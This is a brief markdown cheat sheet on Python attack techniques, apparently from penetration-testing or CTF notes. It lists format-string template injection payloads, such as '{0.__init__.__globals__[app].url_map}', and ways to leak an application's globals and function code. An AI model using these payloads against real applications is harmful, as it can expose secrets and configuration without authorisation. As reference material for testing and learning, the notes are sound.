# Python

## Table of Contents

* [Table of Contents](#table-of-contents)
* [Interactive shell](#interactive-shell)
* [Injection](#injection)
* [Strategy](#strategy)
  * [Template string injection](#template-string-injection)
* [Leaking information](#leaking-information)

Created by [gh-md-toc](https://github.com/ekalinin/github-markdown-toc.go)

## Interactive shell

```bash
ipython
```

## Injection

## Strategy

### Template string injection

* Try to inject just a placeholder to see if params are passed
  ```python
  '{0}'
  ```
* Try to act on the object now
  ```python
  {0.__init__.__globals__[app].url_map}
  ```
  See [Leaking information](#leaking_information)

## Leaking information

* Check [`inspect`](https://docs.python.org/3/library/inspect.html)
* From a python object, get all the globals (incl. vars, functions, classes)
  ```python
  {0.__init__.__globals__}
  ```
* From a function, get its code
  ```python
  foo.__code__
  ```
